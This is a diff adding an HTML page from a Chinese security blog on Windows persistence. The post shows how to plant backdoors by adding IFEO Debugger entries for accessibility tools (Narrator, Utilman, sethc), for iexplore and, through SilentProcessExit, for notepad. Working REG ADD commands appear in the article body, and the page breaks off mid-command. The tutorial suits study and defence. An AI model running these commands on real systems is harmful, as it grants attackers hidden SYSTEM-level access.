@@ -1,0 +1,1055 @@
+
+
+<!DOCTYPE html>
+<html lang="en" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="August Rosenberg">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="权限维持简介 为了保证获取到的目标权限不会因为漏洞的修复而丢失，攻击者通常会在目标上安装一个后门，来保证对目标的持久化控制。  就是安装后门 系统工具替换后门 当我们按照常理运行属于IFEO列表的文件的时候（即可执行文件名在上述的注册表项下，出于简化原  因，IFEO使用忽略路径的方式来匹配它所要控制的程序文件名，所以程序无论放在哪个路径，只要名  字没有变化，它就可以正常运行。）会执行相关的选项">
+<meta property="og:type" content="article">
+<meta property="og:title" content="windwos权限维持">
+<meta property="og:url" content="https://tsy244.github.io/2024/02/16/%E6%B8%97%E9%80%8F/windwos%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/index.html">
+<meta property="og:site_name" content="AU9U5T">
+<meta property="og:description" content="权限维持简介 为了保证获取到的目标权限不会因为漏洞的修复而丢失，攻击者通常会在目标上安装一个后门，来保证对目标的持久化控制。  就是安装后门 系统工具替换后门 当我们按照常理运行属于IFEO列表的文件的时候（即可执行文件名在上述的注册表项下，出于简化原  因，IFEO使用忽略路径的方式来匹配它所要控制的程序文件名，所以程序无论放在哪个路径，只要名  字没有变化，它就可以正常运行。）会执行相关的选项">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/image-20240216085130074.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/image-20240216085706649.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/image-20240216090130363.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/image-20240216095152453.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/image-20240216095327505.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/image-20240216100219800.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/image-20240216100339246.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/image-20240216100435859.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/image-20240216101905870.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/image-20240216101926352.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/image-20240216102138392.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/image-20240216102143408.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/image-20240216102921248.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/image-20240216103052920.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/image-20240216111320006.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/image-20240216110351370.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/image-20240216110442127.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/image-20240216110602534.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/image-20240216110823503.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/image-20240216110916975.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/image-20240216111034670.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/image-20240216111214241.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/image-20240216113647895.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/image-20240216113806741.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/image-20240216114441656.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/image-20240216114845032.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/image-20240216122125942.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/image-20240216122620871.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/image-20240216122852964.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/image-20240216145101156.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/image-20240216151845729.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/image-20240216152325067.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/image-20240216152409726.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/image-20240216152502912.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/image-20240216152541251.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/image-20240216152711441.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/image-20240216153054698.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/image-20240216153010574.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/image-20240216153200582.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/image-20240216153313303.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/image-20240216153934969.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/image-20240216153955507.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/image-20240216154822379.png">
+<meta property="article:published_time" content="2024-02-16T00:36:25.000Z">
+<meta property="article:modified_time" content="2024-02-16T07:52:39.173Z">
+<meta property="article:author" content="August Rosenberg">
+<meta property="article:tag" content="渗透">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/image-20240216085130074.png">
+  
+  
+    <meta name="referrer" content="no-referrer-when-downgrade">
+  
+  
+  <title>windwos权限维持 - AU9U5T</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"tsy244.github.io","root":"/","version":"1.9.4","typing":{"enable":true,"typeSpeed":90,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":"G-BL1W5LRRDJ","gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>AU9U5T&#39;s blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                <span>Home</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>Archives</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                <span>Categories</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>Tags</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                <span>About</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="windwos权限维持"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-author" aria-hidden="true"></i>
+        August Rosenberg
+      </span>
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2024-02-16 08:36" pubdate>
+          February 16, 2024 am
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          11k words
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          95 mins
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">windwos权限维持</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="权限维持简介"><a href="#权限维持简介" class="headerlink" title="权限维持简介"></a>权限维持简介</h1><blockquote>
+<p>为了保证获取到的目标权限不会因为漏洞的修复而丢失，攻击者通常会在目标上安装一个后门，来保证对目标的持久化控制。</p>
+</blockquote>
+<p>就是安装后门</p>
+<h1 id="系统工具替换后门"><a href="#系统工具替换后门" class="headerlink" title="系统工具替换后门"></a>系统工具替换后门</h1><blockquote>
+<p>当我们按照常理运行属于IFEO列表的文件的时候（即可执行文件名在上述的注册表项下，出于简化原  因，IFEO使用忽略路径的方式来匹配它所要控制的程序文件名，所以程序无论放在哪个路径，只要名  字没有变化，它就可以正常运行。）会执行相关的选项参数，这里我们主要利用的参数是 debugger,  通过该参数我们可以实现偷梁换柱。 </p>
+</blockquote>
+<h2 id="常用辅助功能"><a href="#常用辅助功能" class="headerlink" title="常用辅助功能"></a>常用辅助功能</h2><blockquote>
+<ol>
+<li>Shift（sethc）  </li>
+<li>屏幕键盘（osk）  </li>
+<li>辅助工具管理器（Utilman）   </li>
+<li>讲述人（Narrator）</li>
+</ol>
+</blockquote>
+<h2 id="简单演示"><a href="#简单演示" class="headerlink" title="简单演示"></a>简单演示</h2><p>在对方开启rdp的情况之下，我们可以使用登录界面的，讲述人，放大镜等功能实现权限维持</p>
+<p>也就是说，将对应的功能换成自己的payload </p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/image-20240216085130074.png" srcset="/img/loading.gif" lazyload alt="image-20240216085130074"></p>
+<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><blockquote>
+<p>Windows 的辅助功能提供了额外的选项（屏幕键盘，放大镜，屏幕阅读等），可以帮助特殊人士更容易地使用操作系统。  </p>
+<p>然而，这种功能可能会被滥用于在启用 RDP 并获得 Administrator 权限的主机上实现持久化访问。  这种技术会接触磁盘，或者需要修改注册表来执行远程存储的 payload。涉及到的注册表项为 IFEO（Image File Execution Options） ，默认是只有管理员和Local  system有权读写修改。</p>
+</blockquote>
+<figure class="highlight mathematica"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mathematica"><span class="hljs-type">HKEY_LOCAL</span><span class="hljs-type">_MACHINE</span>\<span class="hljs-variable">SOFTWARE</span>\<span class="hljs-variable">Microsoft</span>\<span class="hljs-variable">Windows</span> <span class="hljs-variable">NT</span>\<span class="hljs-variable">CurrentVersion</span>\<span class="hljs-built_in">Image</span> <span class="hljs-built_in">File</span> <span class="hljs-variable">Execution</span> <span class="hljs-built_in">Options</span><br></code></pre></td></tr></table></figure>
+
+<p>关于注册表</p>
+<p>可以理解为windwos的大型的数据库</p>
+<p>使用win+r进入注册表</p>
+<figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">regedit</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/image-20240216085706649.png" srcset="/img/loading.gif" lazyload alt="image-20240216085706649"></p>
+<p>存储的数据都是windwos运行中需要使用的数据，程序运行，程序本生的信息都在注册表</p>
+<p>然后根据上面的进行查找</p>
+<p>可能发现就和我上截图一样发现并没有HKEY_LOCAL_MACHINE的文件夹，可能是用户权限不允许的原因</p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/image-20240216090130363.png" srcset="/img/loading.gif" lazyload alt="image-20240216090130363"></p>
+<p>发现存在</p>
+<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><blockquote>
+<p>当我们按照常理运行属于IFEO列表的文件的时候（即可执行文件名在上述的注册表项下，出于简化原  因，IFEO使用忽略路径的方式来匹配它所要控制的程序文件名，所以程序无论放在哪个路径，只要名  字没有变化，它就可以正常运行。）会执行相关的选项参数，这里我们主要利用的参数是 debugger,  通过该参数我们可以实现偷梁换柱。  </p>
+</blockquote>
+<p>就是劫持的原理，由于他不会检查路径所以我们直接放置我们的payload ，然后需要修改为劫持应用的名字，从而实现劫持</p>
+<blockquote>
+<ol>
+<li>Shift（sethc，粘滞键）  2. 屏幕键盘（osk）  3. 辅助工具管理器（Utilman）  4. 讲述人（Narrator）</li>
+</ol>
+</blockquote>
+<h2 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h2><h3 id="劫持ie"><a href="#劫持ie" class="headerlink" title="劫持ie"></a>劫持ie</h3><p>  以修改IE启动程序为例，实现运行IE程序但是启动的却是cmd。  </p>
+<ol>
+<li><p>找到注册表 HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows  NT\CurrentVersion\Image  File Execution Options 目录下的 iexplore.exe  </p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/image-20240216095152453.png" srcset="/img/loading.gif" lazyload alt="image-20240216095152453"></p>
+</li>
+<li><p>添加一个debugger字符串键值，并且赋值为 cmd.exe 的执行路径</p>
+</li>
+</ol>
+<p>   这里是需要执行什么就填什么的路径</p>
+<p>   <img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/image-20240216095327505.png" srcset="/img/loading.gif" lazyload alt="image-20240216095327505"></p>
+   <figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-symbol">C:</span>\Windows\system32\cmd.exe<br></code></pre></td></tr></table></figure>
+
+<p>   <img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/image-20240216100219800.png" srcset="/img/loading.gif" lazyload alt="image-20240216100219800"></p>
+<p>   如果发现没有<code>explore.exe</code>程序的话，那就直接创建 一个项</p>
+<p>   然后将添加修改这个项</p>
+<p>   现在运行ie </p>
+<p>   <img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/image-20240216100339246.png" srcset="/img/loading.gif" lazyload alt="image-20240216100339246"></p>
+<p>   就是cmd了</p>
+<p>   <img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/image-20240216100435859.png" srcset="/img/loading.gif" lazyload alt="image-20240216100435859"></p>
+<p>   复原之后</p>
+<ol start="3">
+<li><p>也可以直接使用<code>reg</code>命令</p>
+<figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile">REG <span class="hljs-keyword">ADD</span><span class="language-bash"> <span class="hljs-string">&quot;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\iexplore.exe&quot;</span> /t REG_SZ /v Debugger /d <span class="hljs-string">&quot;C:\windows\system32\cmd.exe&quot;</span> /f</span><br></code></pre></td></tr></table></figure>
+
+<p>现在模拟权限维持</p>
+<p>上线之后</p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/image-20240216101905870.png" srcset="/img/loading.gif" lazyload alt="image-20240216101905870"></p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/image-20240216101926352.png" srcset="/img/loading.gif" lazyload alt="image-20240216101926352"></p>
+<p>发现已经添加</p>
+</li>
+</ol>
+<h3 id="劫持-Narrator"><a href="#劫持-Narrator" class="headerlink" title="劫持  Narrator"></a>劫持  Narrator</h3><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile">REG <span class="hljs-keyword">ADD</span><span class="language-bash"> <span class="hljs-string">&quot;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\narrator.exe&quot;</span> /t REG_SZ /v Debugger /d <span class="hljs-string">&quot;C:\windows\system32\cmd.exe&quot;</span> /f</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/image-20240216102138392.png" srcset="/img/loading.gif" lazyload alt="image-20240216102138392"></p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/image-20240216102143408.png" srcset="/img/loading.gif" lazyload alt="image-20240216102143408"></p>
+<p>现在通过远程桌面连接，就直接返回到登录界面进行模拟</p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/image-20240216102921248.png" srcset="/img/loading.gif" lazyload alt="image-20240216102921248"></p>
+<p>还是system权限注意，如果没有密码可能发现登陆不上</p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/image-20240216103052920.png" srcset="/img/loading.gif" lazyload alt="image-20240216103052920"></p>
+<p>远程桌面连接也是一样的</p>
+<h3 id="劫持-Utilman-辅助管理器"><a href="#劫持-Utilman-辅助管理器" class="headerlink" title="劫持  Utilman   辅助管理器"></a>劫持  Utilman   辅助管理器</h3><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile">REG <span class="hljs-keyword">ADD</span><span class="language-bash"> <span class="hljs-string">&quot;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\utilman.exe&quot;</span> /t REG_SZ /v Debugger /d <span class="hljs-string">&quot;C:\windows\system32\cmd.exe&quot;</span> /f</span><br></code></pre></td></tr></table></figure>
+
+<h3 id="notepad"><a href="#notepad" class="headerlink" title="notepad"></a>notepad</h3><p>实现原程序退出后，静默运行后门程序。从而执行notepad 为例，推出后静默运行calc.exe</p>
+<figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile">reg <span class="hljs-keyword">add</span><span class="language-bash"> <span class="hljs-string">&quot;HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\notepad.exe&quot;</span> /v GlobalFlag /t REG_DWORD /d 512 /f</span><br><br>reg <span class="hljs-keyword">add</span><span class="language-bash"> <span class="hljs-string">&quot;HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\notepad.exe&quot;</span> /v ReportingMode /t REG_DWORD /d 1 /f</span><br><br>reg <span class="hljs-keyword">add</span><span class="language-bash"> <span class="hljs-string">&quot;HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\notepad.exe&quot;</span> /v MonitorProcess /t REG_SZ /d <span 